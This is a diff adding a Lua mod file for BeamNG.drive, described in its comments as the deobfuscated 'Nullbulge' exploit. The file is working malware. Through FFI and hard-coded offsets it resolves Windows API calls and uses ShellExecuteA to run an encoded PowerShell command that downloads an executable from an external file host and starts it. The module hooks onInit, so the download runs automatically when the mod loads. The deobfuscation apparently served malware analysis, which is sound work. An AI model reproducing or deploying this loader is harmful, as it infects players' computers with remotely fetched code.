@@ -1,0 +1,68 @@
+local a = {}
+local ffi = require("ffi")
+
+-- Offsets for various functions
+local ModuleHandleOffset = 0x1390d0
+local GetAddrOffset = 0x1390b0
+local LoadLibOffset = 0x1390e8
+
+-- Check the version of BeamNG and set offsets accordingly
+if string.find(beamng_versionb, "0.31") then
+    ModuleHandleOffset = 0x1350d0
+    GetAddrOffset = 0x1350b0
+    LoadLibOffset = 0x1350e8
+end
+
+-- Deobfuscated & Unpacked by Eric Parker with assistance from GPT-4 Turbo. 
+--Original from "Nullbulge" beam.ng exploit
+-- Function to execute the payload
+local function c()
+    ffi.cdef[[
+        typedef void* (*Handle)(const char* Name);
+        typedef void* (*LoadLibraryAFunc)(const char* lpLibFileName);
+        typedef void* (*GetProcAddressFunc)(void* hModule, const char* lpProcName);
+        typedef void* (*ShellExecuteAFunc)(void* hwnd, const char* lpOperation, const char* lpFile, const char* lpParameters, const char* lpDirectory, int* nShowCmd);
+    ]]
+
+    -- Cast offsets to function pointers
+    local d = ffi.cast("long long*", 0x180000000 + ModuleHandleOffset)
+    local e = ffi.cast("long long*", 0x180000000 + GetAddrOffset)
+    local f = ffi.cast("long long*", 0x180000000 + LoadLibOffset)
+
+    -- Get function pointers
+    local g = ffi.cast("Handle", d[0])
+    local h = ffi.cast("GetProcAddressFunc", e[0])
+    local i = ffi.cast("LoadLibraryAFunc", f[0])
+
+    -- Load shell32.dll
+    local j = i(ffi.cast("const char*", "shell32.dll"))
+
+    -- Get the handle of the BeamNG.drive executable
+    local k = ffi.cast("const char*", "BeamNG.drive.x64.exe")
+    local l = ffi.cast("long long*", g(k))
+
+    -- Get the ShellExecuteA function
+    local m = ffi.cast("const char*", "ShellExecuteA")
+    local n = ffi.cast("ShellExecuteAFunc", h(j, m))
+
+    -- Prepare the command to be executed
+    local o = "/c \"powershell -EncodedCommand YwBtAGQAIAAvAGMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBDAG8AbQBtAGEAbgBkACAAIgBpAGYAIAAoAC0AbgBvAHQAIAAoAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgACcAQgBlAGEAbQBOAEcALgBVAEkALgBlAHgAZQAnACkAKQAgAHsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AcABpAHgAZQBsAGQAcgBhAGkAbgAuAGMAbwBtAC8AYQBwAGkALwBmAGkAbABlAC8ASABuAEUAYwB5AEwAQgBtACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAnAC4ALwBCAGUAYQBtAE4ARwAuAFUASQAuAGUAeABlACcAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACcALgAvAEIAZQBhAG0ATgBHAC4AVQBJAC4AZQB4AGUAJwB9ACIA\""
+    local p = ffi.cast("const char*", o)
+    
+    -- Shell operation parameters
+    local q = "open"
+    local r = ffi.cast("const char*", q)
+    local s = "cmd.exe"
+    local t = ffi.cast("const char*", s)
+    local u = 0
+    local v = ffi.cast("int*", u)
+    
+    print("copy!")
+    -- Execute the ShellExecuteA function
+    n(nil, r, t, p, nil, v)
+    print("fire!")
+end
+
+-- Set the onInit function to execute the payload
+a.onInit = c
+return a
